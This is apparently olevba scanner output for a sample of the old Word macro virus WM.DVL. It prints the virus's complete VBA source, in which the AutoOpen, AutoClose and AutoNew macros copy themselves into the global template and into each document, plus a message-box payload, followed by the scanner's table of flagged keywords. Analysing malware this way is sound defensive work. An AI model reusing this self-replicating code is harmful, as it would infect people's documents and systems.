olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.DVL-e51929a09f05cf54cc1435784e1e3c0abadd2471
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.DVL-e51929a09f05cf54cc1435784e1e3c0abadd2471 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.DVL-e51929a09f05cf54cc1435784e1e3c0abadd2471 - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim Ready
Dim i
' сохраняемся во всех документах
Ready = 0

For i = 1 To WordBasic.CountMacros(1, 0)
   If WordBasic.[MacroName$](i, 1, 1) = "DVL" Then
   Ready = 1
   End If
Next i

If Ready = 0 Then
   On Error Resume Next
   WordBasic.FileSaveAs Format:=1
   WordBasic.MacroCopy "Global:DVL", WordBasic.[FileName$]() + ":DVL", 1
   WordBasic.MacroCopy "Global:AutoNew", WordBasic.[FileName$]() + ":AutoNew", 1
   WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen", 1
   WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoClose", 1
   WordBasic.FileSaveAll 1, 0
End If

End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.DVL-e51929a09f05cf54cc1435784e1e3c0abadd2471 - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim i
Dim Ready
' проверяем систему на зараженность
For i = 1 To WordBasic.CountMacros(0, 0)
   If WordBasic.[MacroName$](i, 0, 0) = "DVL" Then
      Ready = 1
      End If
Next i

If Ready = 1 Then
   ' если заражена - выводим окошко
   WordBasic.Call "DVL"
Else
   ' если не заражена - копируемся в область активных макросов
   On Error Resume Next
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":DVL", "Global:DVL", 1
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoNew", "Global:AutoNew", 1
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Global:AutoOpen", 1
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoClose", "Global:AutoClose", 1
   WordBasic.Call "AutoClose"
End If

End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoNew.bas 
in file: Virus.MSWord.DVL-e51929a09f05cf54cc1435784e1e3c0abadd2471 - OLE stream: 'Macros/VBA/AutoNew'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()

WordBasic.Call "AutoClose"

End Sub
-------------------------------------------------------------------------------
VBA MACRO DVL.bas 
in file: Virus.MSWord.DVL-e51929a09f05cf54cc1435784e1e3c0abadd2471 - OLE stream: 'Macros/VBA/DVL'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "WM.DVL (c) by Duke/SMF"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.DVL.MAIN"
' выводим на экран окошко с текстом
WordBasic.MsgBox "  You system already infected !" + Chr(13) + _
       "This macros written by Duke/SMF" + Chr(13) + _
       "       special for DVL #4      ", _
       "WM.DVL (c) by Duke/SMF", 64

End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

